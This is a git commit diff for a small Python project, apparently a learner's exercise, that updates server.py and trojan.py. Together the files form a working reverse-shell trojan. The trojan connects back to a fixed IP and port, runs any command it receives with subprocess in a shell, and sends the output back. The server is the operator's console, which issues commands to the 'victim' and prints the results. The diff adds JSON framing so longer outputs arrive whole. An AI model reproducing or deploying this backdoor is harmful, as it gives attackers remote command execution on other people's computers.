9c0ea5e2cd40806d8146f9819b691b897c744a6e
emre-unaldi <emree.unaldi@gmail.com>
2022-11-09 03:29:40 +0300

    Fixing a few bugs and bugs and editing code

--- server.py
+++ server.py
@@ -2,31 +2,52 @@
 # encoding:utf-8
 import socket
 import subprocess
+import json
 
-socket_connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-socket_connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+def send_data(data):
+    json_data = json.dumps(data)
+    victim_person.send(json_data.encode())
 
-socket_connection.bind(("192.168.1.106", 7171))
-socket_connection.listen(1)
+def get_data():
+    json_data = ""
+    while True:
+        try:
+            get_data_all = victim_person.recv(2048)
+            json_data = json_data + get_data_all.decode()
+            return json.loads(json_data)
+        except ValueError:
+            continue
 
-print("Hedef sistemin bağlantı kurması bekleniyor...")
-victim_person, ip=socket_connection.accept()
-print("Hedef sistem ile bağlantı sağlandı.")
-print("Hedef sistem bilgileri : %s" % str(ip))
-print("[0] ==> Programı Sonlandır")
+def connect():
+    global socket_connection
+    global victim_person
+    global ip
 
-while True:
-    message = input("Komut Gir : ")
-    encode_message = message.encode()
-    victim_person.send(encode_message)
+    socket_connection=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socket_connection.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-    if message == "0":
-        print("Sunucu Kapatıldı.")
-        break
+    socket_connection.bind(("192.168.1.106", 7171))
+    socket_connection.listen(1)
 
-    else:
-        result = victim_person.recv(2048)
-        decode_result = result.decode()
-        print(decode_result)
+    print("Hedef sistemin bağlantı kurması bekleniyor...")
+    victim_person, ip=socket_connection.accept()
+    print("Hedef sistem ile bağlantı sağlandı.")
+    print("Hedef sistem bilgileri : %s" % str(ip))
+    print("[0] ==> Programı Sonlandır")
 
+def commands():
+    while True:
+        code = input("Komut Gir : ")
+        send_data(code)
+
+        if code == "0":
+            print("Sunucu Kapatıldı.")
+            break
+
+        else:
+            result = get_data()
+            print(result)
+
+connect()
+commands()
 socket_connection.close()
--- trojan.py
+++ trojan.py
@@ -2,20 +2,40 @@
 # encoding:utf-8 
 import socket
 import subprocess
+import json
+
+def send_data(data):
+    json_data = json.dumps(data.decode())
+    socket_connection.send(json_data.encode())
+
+def get_data():
+    json_data = ""
+    while True:
+        try:
+            get_data_all = socket_connection.recv(2048)
+            json_data = json_data + get_data_all.decode()
+            return json.loads(json_data)
+        except ValueError:
+            continue
+
+def shell():
+    while True:
+        code = get_data()
+        
+        if code == "0":
+            break
+        else:
+            try:
+                command = subprocess.Popen(code, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                result = command.stdout.read() + command.stderr.read()
+                send_data(result) 
+            except: 
+                error = "Hata: Komut çalıştırılamadı"
+                send_data(error.encode())              
+
 
 socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 socket_connection.connect(("192.168.1.106", 7171))
 
-while True:
-    code = socket_connection.recv(2048)
-    decode_code = code.decode()
-    
-    if decode_code == "0":
-        break
-    
-    else:
-        command = subprocess.Popen(decode_code, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        result = command.stdout.read() + command.stderr.read()
-        socket_connection.send(result)
-
+shell()
 socket_connection.close()
